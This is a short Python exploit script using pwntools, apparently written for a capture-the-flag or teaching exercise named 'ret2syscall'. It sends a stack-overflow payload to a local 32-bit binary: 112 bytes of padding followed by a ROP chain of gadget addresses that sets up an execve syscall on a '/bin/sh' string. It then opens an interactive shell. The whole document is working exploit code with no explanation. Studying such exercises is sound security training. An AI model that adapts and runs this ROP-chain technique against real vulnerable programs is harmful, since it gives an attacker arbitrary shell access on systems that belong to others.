from pwn import *
sh=process("./ret2syscall")
pop_eax_ret = 0x080bb196
pop_ebx_ecx_edx_ret = 0x0806eb90
int_0x80 = 0x08049421
bin_sh = 0x080be408
payload = flat([b'a'*112, pop_eax_ret, 0xb, pop_ebx_ecx_edx_ret, 0, 0, bin_sh, int_0x80])
sh.sendline(payload)
sh.interactive()
